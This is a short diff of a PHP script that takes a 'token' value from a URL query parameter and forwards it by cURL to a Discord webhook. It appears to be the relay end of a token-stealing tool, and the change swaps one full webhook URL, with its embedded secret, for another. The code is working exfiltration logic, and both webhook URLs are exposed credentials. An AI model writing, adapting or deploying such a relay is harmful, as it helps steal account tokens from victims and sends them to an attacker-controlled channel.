@@ -3,7 +3,7 @@
 $dat = $_GET['dat']; // Get the token data from the query parameter
 
 // Define the webhook URL and the message to send
-$webhook_url = 'https://discord.com/api/webhooks/1019999315445432401/Jz6PIw3ydi3h7DqEPoINRGJMpx2hPdzmHEAMbmRYs9A6_c5IWS_Hzuwd7Ro8QtjF4DyU';
+$webhook_url = 'https://discord.com/api/webhooks/1082030092768788620/2IXO2_vusGiucZbDgJe83FS0S6oyeCi4ilhUiICgo-f9aLYXT2f-hL65buFgLS3xAGVd';
 $message = array('content' => 'Token: ' . $dat);
 
 // Use cURL to send the message to the webhook
